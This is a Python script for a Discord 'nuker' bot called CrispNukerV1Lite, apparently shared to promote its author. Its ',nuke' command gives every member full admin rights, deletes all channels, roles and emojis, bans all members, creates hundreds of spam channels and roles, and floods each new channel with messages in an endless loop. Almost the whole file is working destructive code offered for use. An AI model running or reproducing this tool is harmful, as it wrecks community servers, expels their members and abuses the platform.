import discord
from discord.ext import commands
from discord import Permissions
from colorama import Fore, Style
import os
from os import system
from colored import fg, attr
from discord.ext import commands
from pypresence import Presence

os.system('cls')	
os.system('title CrispNukerV1Lite')

font_color = fg('#ccc900')
granted = fg('#59ff00')
denied = fg('#ff0019')
df_color = fg('#0b678f')
df_yellow = fg('#ccc900')

token = input(f"{df_color}[+] {df_yellow}Token: " + Fore.RESET)
spam_channel_name = input(f"{df_color}[+] {df_yellow}Spam Channel Name: " + Fore.RESET)
spam_message_text = input(f"{df_color}[+] {df_yellow}Spam Message Text: " + Fore.RESET)

role_name = input(f"{df_color}[+] {df_yellow}Role Name: " + Fore.RESET)
server_name_change = input(f"{df_color}[+] {df_yellow}Server Name: " + Fore.RESET)
server_icon_change = input(f"{df_color}[+] {df_yellow}Server Icon: " + Fore.RESET)


os.system('cls')
os.system('title CrispNukerV1Lite')

client = commands.Bot(command_prefix=",")

@client.event
async def on_ready():
   print(f''' 

{font_color}        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{font_color}             ✡ | Client       : {granted}{client.user.name}
{font_color}             ✡ | Author       : $$#5215 
{font_color}             ✡ | Server       : Noxious
{font_color}             ✡ | Link         : .gg/MCZKVXjHv6
{font_color}        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{df_color}[+]{df_yellow} Start: ",nuke" ; Stop: ",stop"
{df_color}[+]{df_yellow} Follow me on {df_color}TWT: @KiseeIsHere

{df_color}[+]{df_yellow} Channel name : {spam_channel_name} 
{df_color}[+]{df_yellow} Message      : {spam_message_text}
{df_color}[+]{df_yellow} Role name    : {role_name}
 ''' + Fore.RESET)



@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.message.delete()
    await ctx.bot.logout()
    print(Fore.GREEN + f"{df_color}[+]{df_yellow} {client.user.name} has logged out successfully." + Fore.RESET)
    

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await ctx.guild.edit(name=server_name_change)
      await role.edit(permissions = Permissions.all())
      print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Admin  | @everyone" + Fore.RESET)
    except:
      print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Admin  | @everyone" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Delete | {channel.name}" + Fore.RESET)
      except:
        print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Delete | {channel.name}" + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Banned | {member.name}#{member.discriminator}" + Fore.RESET)
     except:
       print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Banned | {member.name}#{member.discriminator}" + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Delete | {role.name}" + Fore.RESET)
     except:
       print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Delete | {role.name}" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Delete | {emoji.name}" + Fore.RESET)
     except:
       print(f"{df_color}[+]{denied} DENIED {df_yellow}| Delete | {emoji.name}" + Fore.RESET)

    await guild.create_text_channel(spam_channel_name)
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(spam_channel_name)
       await guild.create_role(name=role_name)
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
         print(f"{df_color}[+]{df_yellow} {guild.name} Successfully Nuked using CrispNukerV1Lite" + Fore.RESET)
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(spam_message_text)

client.run(token, bot=True)